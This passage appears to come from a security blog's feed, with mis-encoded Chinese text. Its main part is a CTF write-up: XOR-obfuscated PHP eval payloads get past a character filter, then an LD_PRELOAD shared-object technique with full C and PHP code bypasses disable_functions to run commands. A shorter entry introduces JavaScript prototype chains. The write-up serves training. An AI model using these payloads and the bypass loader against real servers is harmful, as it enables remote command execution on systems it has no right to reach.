      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>bypass_disable_functions</title>
    <url>/2019/10/bypass-disable-functions/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE_ME"></a><a href="http://114.116.44.23:40001/" target="_blank" rel="noopener">RCE_ME</a></h2><h3 id="ç»•è¿‡-amp-è·å–shell"><a href="#ç»•è¿‡-amp-è·å–shell" class="headerlink" title="ç»•è¿‡&amp;è·å–shell"></a>ç»•è¿‡&amp;è·å–shell</h3><p><img src="/2019/10/bypass-disable-functions/image-20191030142752981.png" alt="image-20191030142752981"></p><p>æ ¹æ®ä»£ç è¦æ±‚ï¼š</p><ol>
<li><p>é•¿åº¦ä¸èƒ½å¤§äº40</p>
</li>
<li><p>ä¸èƒ½åŒ…å«å¤§å°å†™å­—æ¯ï¼Œæ•°å­—</p>
</li>
</ol><p>åœ¨PHPä¸­ä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–å¯ä»¥å¾—åˆ°å¦å¤–ä¸€ä¸ªå­—ç¬¦ï¼Œä¾‹å¦‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"!"</span> ^ <span class="string">"&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/bypass-disable-functions/image-20191030150348065.png" alt="image-20191030150348065"></p><p>åˆ©ç”¨è¿™ç‚¹æˆ‘ä»¬å°±èƒ½ç»•è¿‡å¯¹å­—æ¯æ•°å­—çš„è¿‡æ»¤</p><p>ä¹‹åæˆ‘ä»¬è¦ç»•è¿‡å¯¹é•¿åº¦çš„é™åˆ¶ï¼Œ40å­—ç¬¦å®åœ¨æ˜¯é™åˆ¶å¤ªå¤§äº†</p><a id="more"></a>








<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo(); //æ„é€ payloadæ‰§è¡Œphpå‡½æ•°</span></span><br><span class="line">$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;</span><br><span class="line">var_dump($_);      <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">var_dump(urldecode(<span class="string">"%fe%fe%fe%fe"</span>)^urldecode(<span class="string">"%a1%b9%bb%aa"</span>)); <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class="line"><span class="comment">#$_GET[_]($_GET[__])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&amp;_=assert</span></span><br><span class="line"><span class="comment">#&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">//code=assert(eval($_GET[a])&amp;a=phpinfo();)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030152007908.png" alt="image-20191030152007908"></p>
<p>æ¥ç€æ„é€ payloadè®©èšå‰‘æ¥è¿</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">114.116</span>.<span class="number">44.23</span>:<span class="number">40001</span>/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[<span class="number">_</span>]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_<span class="number">_</span>]);&amp;<span class="number">_</span>=assert&amp;_<span class="number">_</span>=<span class="keyword">eval</span>($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030152338199.png" alt="image-20191030152338199"></p>
<p><img src="/2019/10/bypass-disable-functions/image-20191030152446769.png" alt="image-20191030152446769"></p>
<p>flagåªæœ‰rootæƒé™æ‰èƒ½è®¿é—®ï¼Œreadflagä¼°è®¡æ˜¯ç”¨æ¥è¯»flagçš„ã€‚</p>
<p>ç›´æ¥åœ¨è™šæ‹Ÿç»ˆç«¯ä¸­æ‰§è¡Œreadflagå‘½ä»¤</p>
<p><img src="/2019/10/bypass-disable-functions/image-20191030152803007.png" alt="image-20191030152803007"></p>
<p>å‘ç°å‘½ä»¤éƒ½æ— æ³•æ‰§è¡Œï¼ŒæŸ¥çœ‹phpinfo()ï¼›ä¼°è®¡æ˜¯è°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°è¢«ç¦ç”¨äº†</p>
<p> <img src="/2019/10/bypass-disable-functions/1571499768310.png" alt="1571499768310"> </p>
<h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>ä¸€èˆ¬è€Œè¨€ï¼Œåˆ©ç”¨æ¼æ´æ§åˆ¶ web å¯åŠ¨æ–°è¿›ç¨‹ a.binï¼Œa.bin å†…éƒ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•° b()ï¼Œb()  ä½äºç³»ç»Ÿå…±äº«å¯¹è±¡ c.so ä¸­ï¼Œæ‰€ä»¥ç³»ç»Ÿä¸ºè¯¥è¿›ç¨‹åŠ è½½å…± c.soï¼Œæƒ³æ³•åœ¨ c.so å‰ä¼˜å…ˆåŠ è½½å¯æ§çš„ c_evil.soï¼Œc_evil.so  å†…å«ä¸ b() åŒåçš„æ¶æ„å‡½æ•°ï¼Œç”±äº c_evil.so ä¼˜å…ˆçº§è¾ƒé«˜ï¼Œæ‰€ä»¥ï¼Œa.bin å°†è°ƒç”¨åˆ° c_evil.so å†… b() è€Œéç³»ç»Ÿçš„  c.so å†… b()ï¼ŒåŒæ—¶ï¼Œc_evil.so å¯æ§ï¼Œè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ã€‚åŸºäºè¿™ä¸€æ€è·¯ï¼Œå¸¸è§çªç ´ disable_functions  é™åˆ¶æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼ä¸ºï¼š</p>
<ul>
<li>ç¼–å†™ä¸€ä¸ªåŸå‹ä¸º uid_t getuid(void); çš„ C å‡½æ•°ï¼Œå†…éƒ¨æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œå¹¶ç¼–è¯‘æˆå…±äº«å¯¹è±¡ getuid_shadow.soï¼›</li>
<li>è¿è¡Œ PHP å‡½æ•° putenv()ï¼Œè®¾å®šç¯å¢ƒå˜é‡ LD_PRELOAD ä¸º getuid_shadow.soï¼Œä»¥ä¾¿åç»­å¯åŠ¨æ–°è¿›ç¨‹æ—¶ä¼˜å…ˆåŠ è½½è¯¥å…±äº«å¯¹è±¡ï¼›( LD_PRELOADæ˜¯Unixä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºå®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ï¼ŒLDå’ŒåŠ¨æ€åº“æœ‰å…³ï¼ŒPRELOADè¡¨ç¤ºé¢„åŠ è½½ï¼Œç»“åˆèµ·æ¥å°±æ˜¯é¢„å…ˆåŠ è½½çš„åŠ¨æ€åº“ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ä¸­çš„å‡½æ•°ã€‚)</li>
<li>è¿è¡Œ PHP çš„ mail() å‡½æ•°ï¼Œmail() å†…éƒ¨å¯åŠ¨æ–°è¿›ç¨‹ /usr/sbin/sendmailï¼Œç”±äºä¸Šä¸€æ­¥  LD_PRELOAD çš„ä½œç”¨ï¼Œsendmail è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•° getuid() è¢«ä¼˜å…ˆçº§æ›´å¥½çš„ getuid_shadow.so ä¸­çš„åŒå  getuid() æ‰€åŠ«æŒï¼›</li>
<li>è¾¾åˆ°ä¸è°ƒç”¨ PHP çš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆsystem()ã€exec() ç­‰ç­‰ï¼‰ä»å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ã€‚</li>
</ul>
<h4 id="a-cæ–‡ä»¶ï¼š"><a href="#a-cæ–‡ä»¶ï¼š" class="headerlink" title="a.cæ–‡ä»¶ï¼š"></a>a.cæ–‡ä»¶ï¼š</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> passwd[]=<span class="string">"123456"</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input password!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(passwd,argv[<span class="number">1</span>]))&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Invalid\n"</span>);		  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030171503480.png" alt="image-20191030171503480"></p>
<p> å¦‚æœæ˜¯ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥ç¼–å†™ä¸€ä¸ªåŠ¨æ€å‡½æ•°åº“æ¥è¦†ç›–æ‰strcmpå‡½æ•°æ’è¿”å›0ä»¥è¾¾åˆ°ä»»æ„å¯†ç éƒ½è¿”å›Correct </p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">-fPIC ä½œç”¨äºç¼–è¯‘é˜¶æ®µï¼Œå‘Šè¯‰ç¼–è¯‘å™¨äº§ç”Ÿä¸ä½ç½®æ— å…³ä»£ç (<span class="built_in">Position</span>-<span class="literal">Independent</span> Code)ï¼Œ åˆ™äº§ç”Ÿçš„ä»£ç ä¸­ï¼Œæ²¡æœ‰ç»å¯¹åœ°å€ï¼Œå…¨éƒ¨ä½¿ç”¨ç›¸å¯¹åœ°å€ï¼Œæ•…è€Œä»£ç å¯ä»¥è¢«åŠ è½½å™¨åŠ è½½åˆ°å†…å­˜çš„ä»»æ„ ä½ç½®ï¼Œéƒ½å¯ä»¥æ­£ç¡®çš„æ‰§è¡Œã€‚è¿™æ­£æ˜¯å…±äº«åº“æ‰€è¦æ±‚çš„ï¼Œå…±äº«åº“è¢«åŠ è½½æ—¶ï¼Œåœ¨å†…å­˜çš„ä½ç½®ä¸æ˜¯å›ºå®šçš„</span><br></pre></td></tr></table></figure>

<p>evil.cæ–‡ä»¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"evil function\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030172344903.png" alt="image-20191030172344903"></p>
<p>æ‰€ä»¥ç»•è¿‡disable_functions,å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„soæ–‡ä»¶ï¼ŒåŠ«æŒgetuid(),è¾¾åˆ°å‘½ä»¤æ‰§è¡Œç›®çš„ã€‚ä¹‹æ‰€ä»¥åŠ«æŒ getuid()ï¼Œæ˜¯å› ä¸º sendmail  ç¨‹åºä¼šè°ƒç”¨è¯¥å‡½æ•°ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ä¸ºå…¶ä»–è¢«è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°ï¼‰</p>
<p>ä½†æ˜¯è¿™ç§åŠ«æŒå‡½æ•°çš„åšæ³•æœ‰å¾ˆå¤§çš„ç¼ºé™·ï¼š</p>
<p>â€‹    ä¸€æ˜¯ï¼ŒæŸäº›ç¯å¢ƒä¸­ï¼Œweb ç¦æ­¢å¯ç”¨  senmailã€ç”šè‡³ç³»ç»Ÿä¸Šæ ¹æœ¬æœªå®‰è£… sendmailï¼Œä¹Ÿå°±è°ˆä¸ä¸ŠåŠ«æŒ getuid()ï¼Œé€šå¸¸çš„ www-data æƒé™åˆä¸å¯èƒ½å»æ›´æ”¹  php.ini é…ç½®ã€å»å®‰è£… sendmail è½¯ä»¶ï¼›äºŒæ˜¯ï¼Œå³ä¾¿ç›®æ ‡å¯ä»¥å¯ç”¨ sendmailï¼Œç”±äºæœªå°†ä¸»æœºåï¼ˆhostname è¾“å‡ºï¼‰æ·»åŠ è¿›  hosts ä¸­ï¼Œå¯¼è‡´æ¯æ¬¡è¿è¡Œ sendmail éƒ½è¦è€—æ—¶åŠåˆ†é’Ÿç­‰å¾…åŸŸåè§£æè¶…æ—¶è¿”å›ï¼Œwww-data ä¹Ÿæ— æ³•å°†ä¸»æœºååŠ å…¥  hostsï¼ˆå¦‚ï¼Œ127.0.0.1    lampã€lamp.ã€lamp.comï¼‰ </p>
<h4 id="C-è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦"><a href="#C-è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦" class="headerlink" title="C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦"></a>C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦</h4><p>å›åˆ° LD_PRELOAD æœ¬èº«ï¼Œç³»ç»Ÿé€šè¿‡å®ƒé¢„å…ˆåŠ è½½å…±äº«å¯¹è±¡ï¼Œå¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ªæ–¹å¼ï¼Œåœ¨åŠ è½½æ—¶å°±æ‰§è¡Œä»£ç ï¼Œè€Œä¸ç”¨è€ƒè™‘åŠ«æŒæŸä¸€ç³»ç»Ÿå‡½æ•°ï¼Œé‚£å°±å®Œå…¨å¯ä»¥ä¸ä¾èµ– sendmail äº† </p>
<p> GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <code>__attribute__((constructor))</code>ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <code>__attribute__((constructor))</code> ä¿®é¥°çš„å‡½æ•°ã€‚è¿™ä¸€ç»†èŠ‚éå¸¸é‡è¦ï¼Œå¾ˆå¤šæœ‹å‹ç”¨ LD_PRELOAD æ‰‹æ³•çªç ´ disable_functions æ— æ³•åšåˆ°ç™¾åˆ†ç™¾æˆåŠŸï¼Œæ­£å› ä¸ºè¿™ä¸ªåŸå› ï¼Œ<strong>ä¸è¦å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘æ‹¦åŠ«å¯åŠ¨è¿›ç¨‹è¿™ä¸€è¡Œä¸º</strong>ã€‚ </p>
<p> æ­¤å¤–ï¼Œé€šè¿‡ LD_PRELOAD åŠ«æŒäº†å¯åŠ¨è¿›ç¨‹çš„è¡Œä¸ºï¼ŒåŠ«æŒååˆå¯åŠ¨äº†å¦å¤–çš„æ–°è¿›ç¨‹ï¼Œè‹¥ä¸åœ¨æ–°è¿›ç¨‹å¯åŠ¨å‰å–æ¶ˆ LD_PRELOADï¼Œåˆ™å°†é™·å…¥æ— é™å¾ªç¯ï¼Œæ‰€ä»¥å¿…é¡»å¾—åˆ é™¤ç¯å¢ƒå˜é‡ LD_PRELOADã€‚æœ€ç›´è§‚çš„åšæ³•æ˜¯è°ƒç”¨ <code>unsetenv(&quot;LD_PRELOAD&quot;)</code> </p>
<h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><p>PHPä¸­putenv()å‡½æ•°ç”¨äºè®¾ç½®æœåŠ¡å™¨ç¯å¢ƒå˜é‡ï¼Œä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">putenv</span> ( <span class="keyword">string</span> $setting ) : bool</span><br></pre></td></tr></table></figure>

<p>å¦‚</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/evil.so"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="åŠ«æŒå…±äº«åº“ç»•è¿‡disable-functions"><a href="#åŠ«æŒå…±äº«åº“ç»•è¿‡disable-functions" class="headerlink" title="åŠ«æŒå…±äº«åº“ç»•è¿‡disable_functions"></a>åŠ«æŒå…±äº«åº“ç»•è¿‡disable_functions</h4><p>æŠŠreadflagä¸‹è½½åˆ°æœ¬åœ° IDAåç¼–è¯‘</p>
<p> <img src="/2019/10/bypass-disable-functions/1571502795907.png" alt="1571502795907"></p>
<p>bypass.cæ–‡ä»¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ; <span class="comment">//è·å–ç¯å¢ƒå˜é‡</span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">    <span class="comment">//è·å–EVIL_CMDLINEçš„å€¼</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//ä»ç¯å¢ƒå˜é‡ä¸­éå†â€œLD_PRELOADâ€çš„ä½ç½®ï¼Œå¹¶å°†å…¶å€¼è®¾ä¸ºNULLã€‚</span></span><br><span class="line">    <span class="comment">//ä»è€Œä½¿ä¸‹é¢çš„system()æ­£å¸¸æ‰§è¡Œã€‚</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure>

<p>bypass.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline); <span class="comment">//è®¾ç½®EVIL_CMDLINEç¯å¢ƒå˜é‡</span></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);  <span class="comment">//åŠ è½½æ¶æ„åŠ¨æ€åº“</span></span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);  <span class="comment">//åˆ©ç”¨mailå‡½æ•°è§¦å‘æ¶æ„å‡½æ•°ï¼Œè·³è½¬è‡³__attribute__ ((__constructor__))ä¿®é¥°çš„å‡½æ•°ã€‚</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayloadä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=include(%27/tmp/bypass.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/bypass_x64.so</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191103123740141.png" alt="image-20191103123740141"></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejså­¦ä¹ </title>
    <url>/2020/06/nodejs%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-åŸå‹é“¾æ±¡æŸ“"><a href="#1-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="1.åŸå‹é“¾æ±¡æŸ“"></a>1.åŸå‹é“¾æ±¡æŸ“</h2><ul>
<li><code>prototype</code> å’Œ <code>__proto__</code></li>
</ul><p>æ¯ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆ object ï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆç§°ä¹‹ä¸º <strong>proto</strong> ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<strong>prototype</strong> ï¼‰ã€‚è¯¥åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡( <strong>proto</strong> ) ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener"><strong>åŸå‹é“¾</strong></a>ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚</p><a id="more"></a>

<p><img src="/2020/06/nodejså­¦ä¹ /image-20200605161200256.png" alt="image-20200605161200256"></p>
<p>å‡ ä¹æ‰€æœ‰ JavaScript ä¸­çš„å¯¹è±¡éƒ½æ˜¯ä½äºåŸå‹é“¾é¡¶ç«¯çš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object" target="_blank" rel="noopener"><code>Object</code></a> çš„å®ä¾‹ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹</p>
<ol>
<li><code>prototype</code>æ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</li>
<li>ä¸€ä¸ªå¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„<code>prototype</code>å±æ€§</li>
</ol>
<ul>
<li><p>JSåŸå‹é“¾ç»§æ‰¿</p>
<p>  æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ã€‚</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();</span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a);</span><br><span class="line"><span class="built_in">console</span>.log(o.b);</span><br><span class="line"><span class="built_in">console</span>.log(o.c);</span><br><span class="line"><span class="built_in">console</span>.log(o.d);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p><img src="/2020/06/nodejså­¦ä¹ /image-20200605162929085.png" alt="image-20200605162929085"></p>
<p>console.log(o.b);æ‰“å°äº†2 ä¼¼ä¹æ²¡è¢«å½±å“ï¼Œå…¶å®è¿™æ˜¯ä¸ª<code>å±æ€§é®è”½</code> å½“è¦è®¿é—®bå±æ€§æ—¶ï¼Œå¯¹è±¡å…ˆåœ¨è‡ªèº«çš„å±æ€§ä¸­å¯»æ‰¾bï¼Œå¦‚æœä¸å­˜åœ¨b,æ‰ä¼šåˆ° <code>__proto__</code>ä¸­å¯»æ‰¾ï¼Œä¸€å±‚å±‚å¾€ä¸Šï¼Œç›´åˆ°æ‰¾åˆ°bæˆ–è€…null</p>
<p>æ€»ç»“ä¸€ä¸‹</p>
<ol>
<li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li>
<li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code></li>
<li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</li>
</ol>
